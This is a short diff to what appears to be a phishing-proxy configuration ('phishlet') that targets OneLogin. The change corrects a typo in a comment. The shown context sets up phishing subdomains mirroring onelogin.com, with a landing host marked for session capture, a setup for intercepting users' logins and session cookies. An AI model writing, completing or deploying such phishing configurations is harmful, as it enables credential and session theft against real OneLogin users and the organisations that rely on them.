@@ -1,7 +1,7 @@
 name: 'onelogin'
 author: '@perfectlylogical'
 min_ver: '2.3.0'
-# NOTE: Do not forget to change EXMAPLE to the relevant sub domain.
+# NOTE: Do not forget to change EXAMPLE to the relevant sub domain.
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'onelogin.com', session: false, is_landing: false }
   - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'onelogin.com', session: true, is_landing: true}
